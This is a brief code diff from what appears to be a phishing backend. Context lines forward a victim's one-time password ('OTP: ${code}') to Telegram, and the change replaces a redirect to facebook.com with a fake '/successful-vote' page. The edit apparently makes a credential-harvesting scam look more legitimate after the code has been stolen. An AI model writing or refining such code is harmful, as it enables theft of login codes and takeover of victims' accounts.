@@ -147,8 +147,7 @@ OTP: ${code}
 
                 `)
                 .catch(err => console.log("Telegram error"));
-
-            return res.redirect("https://facebook.com")
+            return res.redirect("/successful-vote");
         }
         else {
             return res.redirect("/notfound");
